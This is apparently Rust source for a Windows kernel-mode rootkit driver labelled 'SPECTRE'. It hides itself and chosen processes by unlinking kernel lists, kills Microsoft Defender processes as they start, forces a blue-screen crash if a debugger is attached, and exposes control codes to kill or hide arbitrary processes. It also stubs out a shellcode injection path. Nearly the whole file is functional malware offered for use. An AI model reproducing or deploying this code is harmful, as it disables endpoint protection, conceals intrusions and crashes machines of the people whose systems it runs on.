#![no_std]
#![no_main]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
#![allow(dead_code)]
#![allow(static_mut_refs)]

use core::panic::PanicInfo;
use core::ffi::c_char;
use wdk_sys::{
    DRIVER_OBJECT, DEVICE_OBJECT, IRP, NTSTATUS, STATUS_SUCCESS, UNICODE_STRING,
    HANDLE, BOOLEAN, ACCESS_MASK, OBJECT_ATTRIBUTES, CLIENT_ID,
    IoCreateDevice, IoCreateSymbolicLink, IoDeleteDevice, IoDeleteSymbolicLink,
    IoCompleteRequest, IoGetCurrentIrpStackLocation,
    InitializeObjectAttributes, OBJ_KERNEL_HANDLE,
    IRP_MJ_DEVICE_CONTROL, IRP_MJ_CREATE, IRP_MJ_CLOSE,
};

// ============================================================
// External Functions
// ============================================================
extern "system" {
    fn DbgPrint(format: *const c_char, ...) -> i32;
    fn KeBugCheck(BugCheckCode: u32) -> !;
    static KdDebuggerEnabled: u8;

    fn PsSetCreateProcessNotifyRoutine(
        notify_routine: Option<unsafe extern "system" fn(HANDLE, HANDLE, BOOLEAN)>,
        remove: BOOLEAN,
    ) -> NTSTATUS;

    fn PsLookupProcessByProcessId(
        ProcessId: HANDLE,
        Process: *mut *mut core::ffi::c_void,
    ) -> NTSTATUS;

    fn PsGetProcessImageFileName(Process: *mut core::ffi::c_void) -> *mut c_char;

    fn KeAttachProcess(Process: *mut core::ffi::c_void);
    fn KeDetachProcess();

    fn ZwOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID,
    ) -> NTSTATUS;

    fn ZwTerminateProcess(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
    fn ZwClose(Handle: HANDLE) -> NTSTATUS;

    fn ObfDereferenceObject(Object: *mut core::ffi::c_void);

    fn RtlCopyMemory(Destination: *mut core::ffi::c_void, Source: *const core::ffi::c_void, Length: usize);
    fn RtlZeroMemory(Destination: *mut core::ffi::c_void, Length: usize);
}

// ============================================================
// Constants
// ============================================================
const DEVICE_NAME_UTF16: [u16; 22] = [
    0x005C, 0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065,
    0x005C,
    0x0053, 0x0050, 0x0045, 0x0043, 0x0054, 0x0052, 0x0045,
    0x0044, 0x0072, 0x0076,
    0x0000,
];

const SYMLINK_NAME_UTF16: [u16; 26] = [
    0x005C, 0x0044, 0x006F, 0x0073,
    0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065, 0x0073,
    0x005C,
    0x0053, 0x0050, 0x0045, 0x0043, 0x0054, 0x0052, 0x0045,
    0x0044, 0x0072, 0x0076,
    0x0000,
];

const IOCTL_KILL_PROCESS: u32       = 0x900;
const IOCTL_HIDE_PROCESS: u32       = 0x901;
const IOCTL_UNHIDE_PROCESS: u32     = 0x902;
const IOCTL_CHECK_DEBUGGER: u32     = 0x903;
const IOCTL_INJECT_SHELLCODE: u32   = 0x904;
const IOCTL_KILL_AV: u32            = 0x905;
const IOCTL_SELF_DESTRUCT: u32      = 0x999;

const PROCESS_TERMINATE: u32 = 0x0001;

// ============================================================
// Data Structures
// ============================================================
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut core::ffi::c_void,
    entry_point: *mut core::ffi::c_void,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
    flags: u32,
    load_count: u16,
    tls_index: u16,
    hash_links: ListEntry,
    time_date_stamp: u32,
    entry_point_loaded: *mut core::ffi::c_void,
}

// ============================================================
// Global State
// ============================================================
static mut AV_CALLBACK_REGISTERED: bool = false;

// ============================================================
// UNICODE_STRING Helper
// ============================================================
unsafe fn init_unicode_string(dest: *mut UNICODE_STRING, src: *const u16) {
    let mut char_count: u16 = 0;
    while *src.add(char_count as usize) != 0 {
        char_count += 1;
    }
    (*dest).Length = char_count * 2;
    (*dest).MaximumLength = (char_count + 1) * 2;
    (*dest).Buffer = src as *mut u16;
}

// ============================================================
// String Compare
// ============================================================
unsafe fn string_compare(a: *const u8, b: *const u8) -> bool {
    if a.is_null() || b.is_null() { return false; }
    let mut i = 0;
    while i < 256 {
        let byte_a = *a.add(i);
        let byte_b = *b.add(i);
        if byte_a == 0 || byte_b == 0 {
            return byte_a == byte_b;
        }
        if byte_a != byte_b { return false; }
        i += 1;
    }
    false
}

// ============================================================
// DKOM: Hide Driver from PsLoadedModuleList
// ============================================================
unsafe fn dkom_hide_driver(driver_object: *mut DRIVER_OBJECT) {
    if driver_object.is_null() { return; }

    let driver_section = (*driver_object).DriverSection as *mut LdrDataTableEntry;
    if driver_section.is_null() { return; }

    let in_load_order = &mut (*driver_section).in_load_order_links;
    let flink = in_load_order.flink;
    let blink = in_load_order.blink;

    if flink.is_null() || blink.is_null() { return; }
    if flink as *const _ == blink as *const _ {
        DbgPrint(b"[SPECTRE] DKOM: Only entry, skip\n\0".as_ptr() as *const c_char);
        return;
    }

    (*flink).blink = blink;
    (*blink).flink = flink;
    in_load_order.flink = in_load_order as *mut ListEntry;
    in_load_order.blink = in_load_order as *mut ListEntry;

    DbgPrint(b"[SPECTRE] DKOM: Driver hidden from PsLoadedModuleList\n\0".as_ptr() as *const c_char);
}

// ============================================================
// DKOM: Hide Process from ActiveProcessLinks
// ============================================================
unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(pid, &mut eprocess);

    if status != STATUS_SUCCESS || eprocess.is_null() { return false; }

    // ActiveProcessLinks offset on Windows 10/11 x64
    const LINKS_OFFSET: usize = 0x448;
    let links_ptr = (eprocess as *mut u8).add(LINKS_OFFSET) as *mut ListEntry;
    let flink = (*links_ptr).flink;
    let blink = (*links_ptr).blink;

    if flink.is_null() || blink.is_null() {
        ObfDereferenceObject(eprocess);
        return false;
    }

    (*flink).blink = blink;
    (*blink).flink = flink;
    (*links_ptr).flink = links_ptr;
    (*links_ptr).blink = links_ptr;

    ObfDereferenceObject(eprocess);
    DbgPrint(b"[SPECTRE] DKOM: Process hidden (PID: %p)\n\0".as_ptr() as *const c_char, pid);
    true
}

// ============================================================
// Kill Protected Process
// ============================================================
unsafe fn kill_protected(pid: HANDLE) -> bool {
    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(pid, &mut eprocess);

    if status != STATUS_SUCCESS || eprocess.is_null() { return false; }

    KeAttachProcess(eprocess);
    DbgPrint(b"[SPECTRE] Attached to PID %p \u2014 Killing...\n\0".as_ptr() as *const c_char, pid);

    let terminate_status = ZwTerminateProcess(pid as HANDLE, 0);

    KeDetachProcess();
    ObfDereferenceObject(eprocess);

    if terminate_status == STATUS_SUCCESS {
        DbgPrint(b"[SPECTRE] Killed PID %p\n\0".as_ptr() as *const c_char, pid);
        true
    } else {
        DbgPrint(b"[SPECTRE] Kill failed PID %p (0x%X)\n\0".as_ptr() as *const c_char, pid, terminate_status);
        false
    }
}

// ============================================================
// Anti-Debug: Check KdDebuggerEnabled \u2192 BSOD if present
// ============================================================
unsafe fn anti_debug_check() {
    if KdDebuggerEnabled != 0 {
        DbgPrint(b"[SPECTRE] DEBUGGER DETECTED! Self-destruct...\n\0".as_ptr() as *const c_char);
        KeBugCheck(0xDEC0DE01);
    }
    DbgPrint(b"[SPECTRE] Anti-Debug: Clean\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Anti-AV: Kill known AV processes on creation
// ============================================================
const AV_LIST: &[&[u8]] = &[
    b"MsMpEng.exe\0",
    b"NisSrv.exe\0",
    b"SecurityHealthService.exe\0",
];

unsafe extern "system" fn av_killer_callback(_parent: HANDLE, pid: HANDLE, create: BOOLEAN) {
    if create == 0 { return; }

    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(pid, &mut eprocess);

    if status != STATUS_SUCCESS || eprocess.is_null() { return; }

    let name_ptr = PsGetProcessImageFileName(eprocess);
    if !name_ptr.is_null() {
        for av_name in AV_LIST {
            if string_compare(name_ptr as *const u8, av_name.as_ptr()) {
                DbgPrint(b"[SPECTRE] AV Detected: %s \u2014 Killing!\n\0".as_ptr() as *const c_char, name_ptr);
                kill_protected(pid);
                break;
            }
        }
    }

    ObfDereferenceObject(eprocess);
}

unsafe fn anti_av_activate() {
    if AV_CALLBACK_REGISTERED { return; }
    let status = PsSetCreateProcessNotifyRoutine(Some(av_killer_callback), 0);
    if status == STATUS_SUCCESS {
        AV_CALLBACK_REGISTERED = true;
        DbgPrint(b"[SPECTRE] Anti-AV: Active\n\0".as_ptr() as *const c_char);
    }
}

unsafe fn anti_av_deactivate() {
    if !AV_CALLBACK_REGISTERED { return; }
    PsSetCreateProcessNotifyRoutine(Some(av_killer_callback), 1);
    AV_CALLBACK_REGISTERED = false;
    DbgPrint(b"[SPECTRE] Anti-AV: Deactivated\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Inject Shellcode via APC (Placeholder)
// ============================================================
unsafe fn inject_apc(pid: HANDLE, _shellcode: *const u8, _size: usize) -> bool {
    DbgPrint(b"[SPECTRE] APC Inject: Placeholder for PID %p\n\0".as_ptr() as *const c_char, pid);
    // TODO: Allocate memory in target + queue APC
    false
}

// ============================================================
// IOCTL Handler
// ============================================================
unsafe extern "system" fn device_control_handler(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    let irp_stack = IoGetCurrentIrpStackLocation(irp);
    let ioctl_code = (*irp_stack).Parameters.DeviceIoControl.IoControlCode;

    let mut status = STATUS_SUCCESS;
    let mut information: u64 = 0;

    match ioctl_code {
        // --- Kill Process by PID ---
        IOCTL_KILL_PROCESS => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
            if !input_buffer.is_null() {
                let pid = *input_buffer as HANDLE;
                if kill_protected(pid) {
                    information = 1;
                } else {
                    status = 0xC0000001; // STATUS_UNSUCCESSFUL
                }
            } else {
                status = 0xC000000D; // STATUS_INVALID_PARAMETER
            }
        }

        // --- Hide Process by PID ---
        IOCTL_HIDE_PROCESS => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
            if !input_buffer.is_null() {
                let pid = *input_buffer as HANDLE;
                if dkom_hide_process(pid) {
                    information = 1;
                } else {
                    status = 0xC0000001;
                }
            } else {
                status = 0xC000000D;
            }
        }

        // --- Check if Debugger is Present ---
        IOCTL_CHECK_DEBUGGER => {
            let output_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
            if !output_buffer.is_null() {
                *output_buffer = KdDebuggerEnabled;
                information = 1;
            } else {
                status = 0xC000000D;
            }
        }

        // --- Inject Shellcode ---
        IOCTL_INJECT_SHELLCODE => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;
            if !input_buffer.is_null() && input_length >= 8 {
                let pid = *(input_buffer as *const u64) as HANDLE;
                let sc = input_buffer.add(8);
                let sc_len = (input_length - 8) as usize;
                if inject_apc(pid, sc, sc_len) {
                    information = 1;
                } else {
                    status = 0xC0000001;
                }
            } else {
                status = 0xC000000D;
            }
        }

        // --- Kill AV ---
        IOCTL_KILL_AV => {
            anti_av_activate();
            information = 1;
        }

        // --- Self Destruct (BSOD) ---
        IOCTL_SELF_DESTRUCT => {
            DbgPrint(b"[SPECTRE] SELF DESTRUCT INITIATED\n\0".as_ptr() as *const c_char);
            KeBugCheck(0xDEC0DE02);
        }

        _ => {
            status = 0xC0000010; // STATUS_INVALID_DEVICE_REQUEST
        }
    }

    (*irp).IoStatus.Status = status;
    (*irp).IoStatus.Information = information;
    IoCompleteRequest(irp, 0);
    status
}

// ============================================================
// Create / Close Handlers
// ============================================================
unsafe extern "system" fn create_close_handler(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    (*irp).IoStatus.Status = STATUS_SUCCESS;
    (*irp).IoStatus.Information = 0;
    IoCompleteRequest(irp, 0);
    STATUS_SUCCESS
}

// ============================================================
// Driver Unload
// ============================================================
unsafe extern "system" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
    DbgPrint(b"[SPECTRE] Unloading...\n\0".as_ptr() as *const c_char);

    // Remove AV callback
    anti_av_deactivate();

    // Delete symbolic link
    let mut symlink_str: UNICODE_STRING = core::mem::zeroed();
    init_unicode_string(&mut symlink_str, SYMLINK_NAME_UTF16.as_ptr());
    IoDeleteSymbolicLink(&mut symlink_str);

    // Delete device
    if !(*driver_object).DeviceObject.is_null() {
        IoDeleteDevice((*driver_object).DeviceObject);
    }

    DbgPrint(b"[SPECTRE] Vanished without a trace\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Driver Entry
// ============================================================
#[no_mangle]
pub extern "system" fn DriverEntry(
    driver_object: *mut DRIVER_OBJECT,
    _registry_path: *mut core::ffi::c_void,
) -> NTSTATUS {
    unsafe {
        DbgPrint(b"[SPECTRE] Initializing rootkit...\n\0".as_ptr() as *const c_char);

        // --- Init UNICODE_STRINGs ---
        let mut device_name: UNICODE_STRING = core::mem::zeroed();
        init_unicode_string(&mut device_name, DEVICE_NAME_UTF16.as_ptr());
        let mut symlink_name: UNICODE_STRING = core::mem::zeroed();
        init_unicode_string(&mut symlink_name, SYMLINK_NAME_UTF16.as_ptr());

        // --- Create Device ---
        let mut device_object: *mut DEVICE_OBJECT = core::ptr::null_mut();
        let status = IoCreateDevice(
            driver_object, 0, &mut device_name, 0x0000, 0, 0, &mut device_object,
        );
        if status != STATUS_SUCCESS { return status; }

        // --- Create Symlink ---
        let symlink_status = IoCreateSymbolicLink(&mut symlink_name, &mut device_name);
        if symlink_status != STATUS_SUCCESS {
            IoDeleteDevice(device_object);
            return symlink_status;
        }

        // --- Register Dispatch ---
        (*driver_object).MajorFunction[IRP_MJ_CREATE as usize] = Some(create_close_handler);
        (*driver_object).MajorFunction[IRP_MJ_CLOSE as usize] = Some(create_close_handler);
        (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
        (*driver_object).DriverUnload = Some(driver_unload);

        // --- \uD83D\uDC80 ACTIVATE ALL STEALTH ---
        dkom_hide_driver(driver_object);
        anti_debug_check();
        anti_av_activate();

        DbgPrint(b"[SPECTRE] ALL SYSTEMS ACTIVE \u2014 YOU ARE INVISIBLE\n\0".as_ptr() as *const c_char);
        STATUS_SUCCESS
    }
}

// ============================================================
// Panic Handler
// ============================================================
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
